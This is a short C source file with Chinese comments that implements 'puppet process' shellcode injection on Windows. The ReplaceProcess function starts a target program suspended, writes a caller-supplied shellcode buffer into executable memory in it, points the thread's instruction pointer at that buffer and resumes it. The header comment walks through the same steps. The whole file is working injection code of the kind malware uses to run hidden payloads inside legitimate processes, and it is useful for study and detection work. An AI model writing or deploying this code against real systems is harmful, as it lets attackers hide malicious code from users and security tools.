/*
	傀儡进程
	实现原理:修改指定进程内存数据,向内存中写入ShellCode代码,并修改该进程的执行流程,
使其转而执行ShellCode代码,这样进程还是原来的进程,但是执行的操作变了.
	关键技术点:
		一. 写入ShellCode的时机
		二. 更改执行流程的方法
	CreateProcess提供CREATE_SUSPENDED作为线程创建后主进程挂起的标志,这时主线程处于挂起状态,
直到ResumeThread恢复线程,方可执行.使用SetThreeadContext可以修改线程上下文中的EIP数据.

	实现流程:
	1. CreateProcess创建进程,设置CREATE_SUSPENDED挂起进程标志
	2. 调用VirtualAllocEx函数在新进程申请一个可读可写可执行的内存,并调用WriteProcessMemory
写入ShellCode数据,考虑到傀儡进程内存占用过大的问题,也可以调用ZwUnmapViewOfSection函数卸载
傀儡进程并加载模块
	3. 调用GetThreeadContext,设置获取标志CONTEXT_FULL,修改EIP,再调用SetThreeadContext
	4. 调用ResumeThread恢复进程
*/

BOOL ReplaceProcess(WCHAR* pszFilePath, PVOID pRelaceData, DWORD dwReplaceDataSize, DWORD dwRunOffset)
{
	//1. CreateProcess创建目标进程,设置CREATE_SUSPENDED挂起进程标志
	STARTUPINFO stcSi = { 0 };
	stcSi.cb = sizeof(stcSi);
	PROCESS_INFORMATION stcPi = { 0 };
	BOOL bRet = CreateProcessW(pszFilePath, NULL, NULL, NULL, FALSE, CREATE_SUSPENDED,
		NULL, NULL, &stcSi, &stcPi);
	if (!bRet)
	{
		printf("创建进程失败\n");
		return FALSE;
	}
	//2. 调用VirtualAllocEx函数在新进程申请一个可读可写可执行的内存,并调用WriteProcessMemory
	//写入ShellCode数据, 考虑到傀儡进程内存占用过大的问题, 也可以调用ZwUnmapViewOfSection函数卸载
	//傀儡进程并加载模块
	LPVOID lpBuffer = VirtualAllocEx(stcPi.hProcess, NULL, dwReplaceDataSize,
		MEM_COMMIT | MEM_RESERVE, PAGE_EXECUTE_READWRITE);
	if (!lpBuffer)
	{
		printf("申请内存失败\n");
		return FALSE;
	}
	WriteProcessMemory(stcPi.hProcess, lpBuffer, pRelaceData, dwReplaceDataSize, NULL);
	//3.调用GetThreeadContext,设置获取标志CONTEXT_FULL,修改EIP,再调用SetThreeadContext
	CONTEXT stcCt = { CONTEXT_FULL };
	GetThreadContext(stcPi.hThread, &stcCt);
	stcCt.Eip = (DWORD)lpBuffer + dwRunOffset;
	SetThreadContext(stcPi.hThread, &stcCt);
	//4.调用ResumeThread恢复进程
	ResumeThread(stcPi.hThread);
	return TRUE;
}
